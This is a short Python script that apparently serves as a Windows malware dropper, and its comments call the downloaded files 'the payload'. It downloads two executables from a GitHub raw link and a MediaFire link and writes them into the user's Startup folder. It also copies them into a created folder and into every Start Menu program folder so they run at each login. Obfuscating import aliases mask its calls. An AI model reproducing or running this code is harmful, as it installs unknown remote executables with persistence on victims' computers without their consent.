from os import system as sus, getenv as ghebe, listdir, path
from requests import get as loc

# vars 

url1, url2 = 'https://github.com/Spaceish/swap-base/raw/master/yny.exe', 'https://download856.mediafire.com/52vdph6e1nug/hkleocww3qbbc95/ynysebu.exe'
url_file1, url_file2 = loc(url=url1, allow_redirects=True).content, loc(url=url2, allow_redirects=True).content
file1_ext, file2_ext = url1.split('/')[-1].split('.')[-1], url2.split('/')[-1].split('.')[-1]

dir2 = f"{ghebe('appdata')}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
dir3 = f"{ghebe('appdata')}\\Microsoft\\Windows\\Start Menu\\Programs"


# making the placeholder folder for the payload to run at startup
sus(f"cd {dir3} && rmdir suus && mkdir suus && exit")
# putting the payload in the startup folders
open(f"{dir2}\\sebu.{file2_ext}", 'wb').write(url_file2);open(f"{dir2}\\pocc.{file1_ext}", 'wb').write(url_file1)
# putting the payload in the placeholder folder a couple of times to ensure that it runs on startup
for _ in range(3): open(f"{dir3}\\suus\\pocc.{file2_ext}", 'wb').write(url_file2)
# also putting the payload in every startup app it finds
for folder in listdir(dir3):
    f = path.join(dir3, folder)
    if path.isdir(f):
        open(f"{f}\\pocc.{file2_ext}", 'wb').write(url_file2)